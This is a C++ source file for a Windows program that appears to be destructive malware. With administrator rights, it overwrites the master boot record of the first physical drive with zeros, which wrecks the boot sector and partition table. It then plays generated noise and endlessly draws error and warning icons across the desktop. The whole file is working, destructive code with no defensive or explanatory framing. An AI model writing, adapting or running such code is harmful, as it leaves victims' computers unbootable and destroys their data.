#pragma comment(lib, "winmm.lib")
#include <Windows.h>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <iostream>

const BYTE MBR_Data[512] = {};

#define SCREEN_WIDTH 2560
#define SCREEN_HEIGHT 1440

HICON icons[] = {
    LoadIcon(NULL, IDI_ERROR),
    LoadIcon(NULL, IDI_WARNING),
    LoadIcon(NULL, IDI_INFORMATION),
    LoadIcon(NULL, IDI_QUESTION)
};

size_t s_icons = sizeof(icons) / sizeof(HICON);

void DrawIcons() {
    HWND hWnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hWnd);

    DrawIcon(hdc, rand() % SCREEN_WIDTH, rand() % SCREEN_HEIGHT, icons[rand() % s_icons]);

    ReleaseDC(hWnd, hdc);
}

void sound1() {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        return;

    unsigned char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = (unsigned char)((t & 6) * t / 43 & (t * t + 45));

    WAVEHDR header = {};
    header.lpData = (LPSTR)buffer;
    header.dwBufferLength = sizeof(buffer);

    if (waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)) != MMSYSERR_NOERROR) {
        waveOutClose(hWaveOut);
        return;
    }

    if (waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)) != MMSYSERR_NOERROR) {
        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);
        return;
    }

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(10);
    }

    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int main() {
    srand((unsigned)time(NULL));

    HANDLE hDrive = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDrive == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open physical drive. Run as admin.\n";
        return 1;
    }

    DWORD bytesWritten = 0;
    BOOL result = WriteFile(hDrive, MBR_Data, sizeof(MBR_Data), &bytesWritten, NULL);
    CloseHandle(hDrive);

    if (!result || bytesWritten != sizeof(MBR_Data)) {
        std::cerr << "Failed to write MBR data.\n";
        return 1;
    }

    std::cout << "MBR overwritten successfully.\n";

    std::thread soundThread(sound1);

    while (1) {
        DrawIcons();
    }

    soundThread.join();

    return 0;
}
